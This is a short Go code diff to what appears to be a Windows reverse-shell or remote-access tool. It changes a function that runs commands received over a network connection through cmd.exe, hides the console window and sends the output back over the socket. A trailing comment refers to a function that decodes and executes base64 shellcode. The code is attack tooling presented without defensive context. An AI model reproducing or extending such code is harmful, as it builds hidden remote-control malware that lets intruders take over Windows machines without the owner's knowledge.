@@ -4,6 +4,7 @@ package shell
 
 import (
 	"encoding/base64"
+	"fmt"
 	"net"
 	"os/exec"
 	"syscall"
@@ -27,12 +28,11 @@ func GetShell() *exec.Cmd {
 // and redirects the result to the provided net.Conn object.
 func ExecuteCmd(command string, conn net.Conn) {
 	//cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
-	cmd_path := "C:\\Windows\\System32\\cmd.exe"
-	cmd := exec.Command(cmd_path, "/c", command+"\n")
+	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c",
+		fmt.Sprintf("%s\n", command))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Run()
+	b, _ := cmd.CombinedOutput()
+	NewWindowsConn(conn).Write(b)
 }
 
 // InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
